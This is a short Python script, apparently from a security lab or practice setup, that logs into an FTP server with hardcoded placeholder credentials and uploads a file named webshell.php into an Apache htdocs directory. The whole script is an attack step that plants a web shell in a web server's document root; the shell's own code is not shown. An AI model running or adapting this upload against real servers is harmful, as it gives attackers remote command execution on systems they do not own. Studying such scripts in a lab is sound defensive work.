from ftplib import FTP

apacheDir = "htdocs"
serverName = "server"
serverID = "server"
serverPW = "server"

ftp = FTP(serverName, serverID, serverPW)
ftp.cwd("APM_Setup/htdocs")

fp = open("webshell.php","rb")
ftp.storbinary("STOR webshell.php",fp)          

fp.close()
ftp.quit()
